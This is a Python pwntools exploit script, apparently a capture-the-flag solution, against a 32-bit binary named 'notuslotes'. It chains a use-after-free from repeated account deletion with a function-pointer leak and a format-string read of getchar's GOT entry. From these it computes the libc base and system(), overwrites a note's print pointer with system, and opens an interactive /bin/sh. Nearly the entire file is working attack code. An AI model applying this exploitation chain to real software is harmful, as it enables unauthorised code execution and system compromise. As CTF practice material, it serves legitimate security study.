#!/usr/bin/env python

from pwn import *

if __name__ == "__main__":
  binary = './notuslotes'

  elf = ELF(binary)
  libc = ELF('/lib32/libc.so.6')

  # x = process(['ltrace', '-o', 'debug', '-f', '-e', 'malloc', '-e', 'free', '-e', 'strncmp', './notuslotes'])
  x = process(binary)

  # socat tcp-l:4000,reuseaddr,fork exec:"ltrace -f -e malloc -e free  ./notuslotes"
  # x = remote('127.0.0.1', '4000')

  x.recvuntil("> ")
  # ------------------------------------------
  # Create user 'account1'
  x.sendline('0') 
  x.sendline('account1')
  x.sendline('N')
  x.recvuntil("> ")

  # Create user 'account2'
  x.sendline('0') 
  x.sendline('account2')
  x.sendline('N')
  x.recvuntil("> ")
  # ------------------------------------------
  # Delete user 'account1'
  x.sendline('1') 
  x.sendline('account1')

  # Delete user 'account2'
  x.sendline("Y")
  x.sendline('account2')

  # Delete user 'account1'
  x.sendline('Y')
  x.sendline('')
  x.sendline('N')
  x.recvuntil("> ")
  # ------------------------------------------
  # Create user 'account1'
  x.sendline('0')
  x.sendline('account1')
  x.sendline('N')
  x.recvuntil("> ")

  # Create user 'account2'
  x.sendline('0')
  x.sendline('account2')
  x.sendline('N')
  x.recvuntil("> ")    

  # Create user 'account1' (s[19] = ADMIN)
  x.sendline('0')
  x.sendline('account1')
  x.sendline('Y')
  x.recvuntil("> ")
  # ------------------------------------------
  # List users
  x.sendline('2')
  log.info(x.recvuntil("> "))
  # ------------------------------------------
  # Log in as account1 (admin)
  x.sendline('3')
  x.sendline('account1')
  x.recvuntil("> ")
  # ------------------------------------------
  # Delete users 'account1', 'account2', 'account1' again
  x.sendline('1')
  x.sendline('account1')
  x.sendline('Y')
  x.sendline('account2')
  x.sendline('Y')
  x.sendline('account1')
  x.sendline('N')
  x.recvuntil("> ")
  # ------------------------------------------
  # Create note (malloc) where 'account1' was previously stored
  # notes = 12B content + 4B (print) function
  x.sendline('4')
  x.sendline('A' * 12)
  x.sendline('G') # printGeneral()
  x.sendline('')  # To get rid of previous getchar() 

  # Print notes
  x.sendline('5')
  x.recvuntil('A' * 12)
  log.info("Leaked printGeneral() address: " + hex(u32(x.recv(4)))) 
  x.recvline()

  # Dummy account
  x.sendline('0')
  x.sendline('account1')
  x.sendline('N')
  x.recvuntil("> ")

  # root@kali64:~$ readelf --relocs notuslotes  | grep getchar
  # 0804b014  00000307 R_386_JUMP_SLOT   00000000   getchar@GLIBC_2.0

  # Create account which leaks libc getchar() symbol using print(), in 'print notes' output
  got_getchar_address = elf.got['getchar']
  format_string = '__%14$s_'
  print_address = elf.symbols['print']

  x.sendline('0')
  payload_account = p32(got_getchar_address) + format_string + p32(print_address)
  x.sendline(payload_account)
  x.sendline('N')
  x.recvuntil("> ")

  # Leak the getchar() symbol address
  x.sendline('5')
  x.recvuntil('__')
  getchar_leak = u32(x.recv(4))
  log.info("Leaked getchar() address: " + hex(getchar_leak))

  # Compute the libc base address
  libc.address = getchar_leak - libc.symbols['getchar']
  log.info("Libc base address: " + hex(libc.address))

  # Compute the system address
  system_address = libc.symbols['system']
  log.info("Computed system() address: " + hex(system_address))

  # Remove the account with our payload
  x.sendline('1')
  x.sendline(payload_account)
  x.sendline('N')
  x.recvuntil("> ")

  # Create user with system() printing function
  x.sendline('0')
  payload_account = "/bin/sh;____" + p32(system_address)
  x.sendline(payload_account)
  x.sendline('N')
  x.recvuntil("> ")
  
  # Execute system('/bin/sh')
  x.sendline('5')
  x.interactive()
